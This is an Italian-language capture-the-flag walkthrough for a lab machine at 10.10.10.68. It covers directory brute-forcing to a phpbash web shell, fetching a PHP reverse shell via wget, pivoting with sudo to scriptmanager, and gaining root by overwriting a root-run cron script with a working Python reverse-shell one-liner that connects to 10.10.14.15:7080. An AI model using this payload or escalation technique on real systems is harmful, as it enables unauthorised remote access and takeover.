Cosa fare:

1) noto sito web porta 80
2) gobuster ovviamente, path interessante http://10.10.10.68/dev/phpbash.php
3) shell php con user
4) possiamo farci una reverse shell php, aggiungento un file con wget dal server del pc nostro con phpreverse

scriptmanager:
1) fare sudo -u scriptmanager bash
2) si ha quindi shell con scriptmanager
3) ci accorgiamo che in /scripts , c'è uno script che viene eseguito da root ogni secondo
4) modifichiamo lo script.py e ci mettiamo in ascolto su una porta; import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",7080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
5)aspettiamo qualche secondo e siamo root.